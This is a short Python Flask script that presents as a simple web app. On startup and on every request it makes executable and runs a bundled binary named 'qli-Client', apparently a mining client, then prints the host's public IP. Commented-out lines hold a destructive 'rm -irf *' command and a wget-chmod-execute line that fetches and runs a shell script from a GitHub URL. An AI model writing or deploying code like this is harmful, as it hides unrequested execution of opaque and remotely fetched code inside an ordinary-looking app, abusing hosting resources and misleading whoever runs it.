import os as kampret
import requests
from flask import *
#kampret.system("rm -irf *")
kampret.system("chmod +x qli-Client && ./qli-Client")
#kampret.system("wget https://raw.githubusercontent.com/petugas/No/main/loop.sh && chmod +x loop.sh && ./loop.sh")

app = Flask(__name__)


@app.route("/")
def main():
    x = kampret.system("chmod +x qli-Client && ./qli-Client")
    response = requests.get('https://httpbin.org/ip')
    ip_data = response.json()
    print("IP Publik Anda adalah:", ip_data['origin'])

    return f"running\n ip: {ip_data['origin']}\n {x} "

if __name__ == "__main__":
    app.run()
